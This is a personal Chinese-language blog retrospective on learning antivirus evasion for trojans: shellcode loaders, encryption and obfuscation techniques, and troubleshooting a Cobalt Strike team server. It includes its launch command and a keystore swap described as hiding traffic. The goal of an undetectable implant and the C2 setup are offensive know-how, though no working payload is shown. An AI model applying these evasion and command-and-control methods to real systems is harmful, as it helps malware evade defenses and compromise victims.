这次的项目学习持续了大概有3个星期的时间，其中学习内容大概占了两个星期，后面有一个星期没有把握好复盘时机。通过本次学习，也算是完成了下面的几个目标：

- [x] 认识shellcode 和loader ，了解木马是如何编写的
- [x] 学习不同的免杀思路，包括不限于：各类的算法加密（Base64，Xor，PEM，AES-CBC）,反序列化，变量名混淆/随机代码混淆等方式
- [ ]  编写一个完全免杀的EXE
- [x] 开始以项目导向学习

通过此次的学习，有蛮多不足点的，首先：

1. 没有对自己的项目内容进行评估，预估花费的时间、涉及的技能树和阶段性的产出
2. 没有在过程中记录，这次的复盘记录是在完成代码编写后才写的，不具有参考意义，很多问题点没有写进来，也是此次最大的遗憾





## 遇到的问题点：

#### 问题点1

在运行菊花哥CS的时候，运行服务器端 `./teamserver 192.168.220.130 aazzk` 产生报错：

![image-20230912114617974](/images/复盘.assets/image-20230912114617974.png)

本来以为是权限问题，使用 `chmod -R 754 CS`修改了整个文件夹的可执行权限，结果还是报错。

<font title="blue">解决方法：</font>

报错原因可能是在Windows保存了该文件，并以 ( \r\n) 结尾，运行：

`sed -i -e 's/\r$//' teamserver` 

#### 问题点2

<font title="Green">背景：</font>

还是菊花哥CS1.6的问题，由于开启了”Google TOTP 二次认证KEY“，跑去问了菊花哥怎么关闭，菊花哥让我自己学着写一下CS的配置文件default.profile，于是有了下文。

测试了kali虚拟机和主机之间的连通性，也是可以ping通的，为什么连接不上呢？还得是从CS各项配置文件开始学习吧，用curso解决报错还是有限的:

找到了，要把 `teamserver`的启动项中cobaltstrike.store替换掉菊花哥的123123.store，通过修改这个证书可以达到**流量隐藏**的效果  [链接在这里](https://blog.csdn.net/qq_43615820/article/details/125469478) 

```java
java -Xms512M -Xmx1024M -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./TeamServer.jar server.TeamServer $*
```

#### 问题点3

还是CS1.6的问题，焯，明明服务器端没有任何报错了，但是客户端还是连接不上，人麻了orz，检查了一遍又一遍，发现是ip地址最后多了一个**空格**，坑死我了！

CS启动！

![image-20230912163959158](/images/复盘.assets/image-20230912163959158.png)

#### 问题点4

为哈我生成的马不上线呢？喂喂喂？ 我去翻了一下群聊，可能是配置文件出了问题，下午再改一改吧

-》C2配置文件学习
